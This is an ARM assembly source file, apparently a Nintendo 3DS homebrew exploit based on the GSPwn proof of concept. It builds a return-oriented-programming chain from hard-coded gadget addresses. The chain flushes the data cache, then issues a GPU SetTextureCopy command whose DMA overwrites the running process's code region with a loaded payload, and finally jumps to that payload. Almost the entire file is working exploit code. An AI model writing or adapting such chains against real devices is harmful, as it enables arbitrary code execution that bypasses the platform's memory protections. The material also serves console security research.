	.arm
	.text

@---------------------------------------------------------------------------------
@ Based on GSPwn 6.3 PoC
@    by smea
@---------------------------------------------------------------------------------

#include "defines_11x.h"
#define GSPHEAP 0x30000000
#define CODELOAD GSPHEAP+0x02f38200
#define CODESIZE 1024*4
#define TEXTPAOFFSET 0x03F01000
#define GARBAGE 0x77777777
#define KHANDLE 0xFFFF8001
#define POP_R1R2R3R7PC 0x0014d114+1
#define LDR_R0R0_POPR4PC 0x001be816+1
#define POP_R42R12 0x00119ca8
#define ADD_R0R0R2_BXLR 0x001a4770
#define LDMR4LR_BXR12 0x0013496c
#define NNGXLOW 0x001bbcdc
//#define GSP_INTERRUPT 0x001c1364
#define GSP_INTERRUPT 0x002965d8


	.global	_start
@---------------------------------------------------------------------------------
_start:
@---------------------------------------------------------------------------------
	

@---------------------------------------------------------------------------------
@ flush data cache
@---------------------------------------------------------------------------------
	.word POP_R1R2R3R7PC 		@ pop {r1, r2, r3, pc}
		.word KHANDLE		@ r1 (kprocess handle)
		.word CODELOAD		@ r2 (address)
		.word CODESIZE		@ r3 (size)
		.word GARBAGE		@ r7
	.word POP_R0PC			@ pop {r0, pc}
		.word GSPGPU_SERVHANDLEADR	@ r0 (handle)
	.word GSPGPU_FlushDataCache	@ GSPGPU_FlushDataCache (ends in ldmfd   sp!, {r4-r6,pc})
		.word GARBAGE   	@ r4 (garbage)
		.word GARBAGE   	@ r5 (garbage)
		.word GARBAGE   	@ r6 (garbage)
	.word POP_R0PC
		.word GSP_INTERRUPT  	@ load r0 value (nn__gxlow__CTR__detail__GetInterruptReceiver)
	.word POP_R1PC			@ pop {r1, r2, r3, pc}
		.word gxCommand		@ (r1) @ load gx command buffer address into r1
@---------------------------------------------------------------------------------
@ send gx command
@---------------------------------------------------------------------------------
	.word NNGXLOW			@ nn__gxlow__CTR__CmdReqQueueTx__TryEnqueue (ends in ldmfd sp!, {r4-r10,pc})
		.word GARBAGE   	@ r4 (garbage)
		.word GARBAGE   	@ r5 (garbage)
		.word GARBAGE   	@ r6 (garbage)
		.word GARBAGE   	@ r7 (garbage)
		.word GARBAGE   	@ r8 (garbage)
		.word GARBAGE   	@ r9 (garbage)
		.word GARBAGE   	@ r10 (garbage)

@---------------------------------------------------------------------------------
@ sleep for a bit (wait for DMA to be done) and jump to copied code
@---------------------------------------------------------------------------------
	.word POP_R42R12		@ pop {r4, r5, r6, r7, r8, r9, sl, fp, ip, pc}
		.word GARBAGE   	@ r4 (garbage)
		.word GARBAGE   	@ r5 (garbage)
		.word GARBAGE   	@ r6 (garbage)
		.word GARBAGE   	@ r7 (garbage)
		.word GARBAGE   	@ r8 (garbage)
		.word GARBAGE   	@ r9 (garbage)
		.word GARBAGE   	@ r10 (garbage)
		.word GARBAGE   	@ r11 (garbage)
		.word POP_R0PC		@ r12 (next return address) (pop {r0, pc})
	.word LDMR4LR_BXR12		@ ldmfd  sp!, {r4,lr} | bx  r12
		.word GARBAGE   	@ r4 (garbage)
		.word 0x00101000	@ lr (next return address) (code !)
@---------------------------------------------------------------------------------
@ equivalent to .word POP_R0PC ; pop {r0, pc}
@---------------------------------------------------------------------------------
		.word 0x40000000	@ r0 = about 1 second

	.word svcSleepThread		@ svcSleepThread

	.align 4
@---------------------------------------------------------------------------------
gxCommand:
@---------------------------------------------------------------------------------
	.word 0x00000004		@ command header (SetTextureCopy)
	.word CODELOAD			@ source address
	.word TEXTPAOFFSET+GSPHEAP	@ destination address
	.word 0x00001000		@ size
	.word 0xFFFFFFFF		@ dim in
	.word 0xFFFFFFFF		@ dim out
	.word 0x00000008		@ flags
	.word 0x00000000		@ unused

.balign 32


